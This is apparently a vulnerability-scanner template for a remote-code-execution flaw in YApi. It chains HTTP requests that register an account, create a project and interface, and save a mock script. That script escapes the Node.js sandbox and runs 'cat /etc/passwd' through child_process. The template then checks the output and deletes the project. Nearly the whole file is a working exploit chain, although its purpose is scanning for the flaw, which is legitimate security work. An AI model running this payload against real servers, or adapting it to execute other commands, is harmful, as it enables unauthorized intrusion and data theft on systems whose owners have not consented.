id: yapi-rce

info:
    name: Yapi RCE
    author: zan8in
    severity: critical

set:
    redemail: randomLowercase(15)
    redpassword: randomLowercase(15)
    randstr_1: randomLowercase(15)
rules:
    r0:
        request:
            method: POST
            path: /api/user/reg
            headers:
                Content-Type: application/json;charset=UTF-8
            body: |
                {"email":"{{redemail}}@qq.com","password":"{{redpassword}}","username":"{{redemail}}"}
        expression: response.status == 200 && response.raw_header.bcontains(b"_yapi_token=") && response.body.bcontains(bytes(redemail))
        output:
          search: '"Set-Cookie: _yapi_token=(?P<yapi_token>.*?);".bsubmatch(response.raw_header)'
          yapi_token: search["yapi_token"]
          search2: '"_yapi_uid=(?P<yapi_uid>.*?);".bsubmatch(response.raw_header)'
          yapi_uid: search2["yapi_uid"]
    r1:
        request:
            method: GET
            path: /api/group/list
            headers: 
              Cookie: _yapi_token={{yapi_token}};_yapi_uid={{yapi_uid}}
        expression: response.status == 200 && response.content_type.icontains("application/json") && response.body.bcontains(bytes("custom_field1"))
        output:
            search11: '"\"_id\":(?P<group_id>.+?),".bsubmatch(response.body)'
            group_id: search11["group_id"]
    r2:
        request:
            method: POST
            path: /api/project/add/
            headers:
                Content-Type: application/json;charset=UTF-8
                Cookie: _yapi_token={{yapi_token}};_yapi_uid={{yapi_uid}}
            body: |
                {"name":"{{redproject}}","basepath":"","group_id":"{{group_id}}","icon":"code-o","color":"cyan","project_type":"private"}
        expression: response.status == 200 &&  response.body.bcontains(b'"uid"') && response.body.bcontains(b'"group_id"')
        output:
            search22: '"tag\":\\[\\],\"_id\":(?P<project_id>.+?),".bsubmatch(response.body)'
            project_id: search22["project_id"]
    r3:
      request:
        method: GET
        headers:
          Cookie: _yapi_token={{yapi_token}};_yapi_uid={{yapi_uid}}
        path: /api/project/get?id={{project_id}}
      expression: response.status == 200 &&  response.body.bcontains(b'"uid"') && response.body.bcontains(b'"group_id"')
    r4:
      request:
        method: POST
        path: /api/interface/add
        headers:
          Content-Type: application/json;charset=UTF-8
          Cookie: _yapi_token={{yapi_token}};_yapi_uid={{yapi_uid}}
        body: |
          {"method":"GET","catid":"{{project_id}}","title":"{{randstr_1}}","path":"/{{randstr_1}}","project_id":{{project_id}}}
      expression: response.status == 200 && response.body.bcontains(b'"req_body_form"')
      output:
        search33: '"\"req_body_form\":\\[\\],\"_id\":(?P<interface_id>.+?),".bsubmatch(response.body)'
        interface_id: search33["interface_id"]
    r5:
      request:
        method: POST
        path: /api/plugin/advmock/save
        headers:
          Cookie: _yapi_token={{yapi_token}};_yapi_uid={{yapi_uid}}
          Content-Type: application/json;charset=UTF-8
        body: |
          {"project_id":"{{project_id}}","interface_id":"{{interface_id}}","mock_script":"const sandbox = this\r\nconst ObjectConstructor = this.constructor\r\nconst FunctionConstructor = ObjectConstructor.constructor\r\nconst myfun = FunctionConstructor('return process')\r\nconst process = myfun()\r\nmockJson = process.mainModule.require(\"child_process\").execSync(\"cat /etc/passwd\").toString()","enable":true}
      expression: response.status == 200
    r6:
      request:
        method: GET
        path: /mock/{{project_id}}/{{randstr_1}}
        headers:
          Cookie: _yapi_token={{yapi_token}};_yapi_uid={{yapi_uid}}
      expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
    r7:
      request:
          method: POST
          path: /api/project/del
          headers:
            Cookie: _yapi_token={{yapi_token}};_yapi_uid={{yapi_uid}}
            Content-Type: application/json;charset=UTF-8
          body: |
              {"id":{{project_id}}}
      expression: response.status == 200
expression: r0() && r1() && r2() && r3() && r4() && r5() && r6() && r7()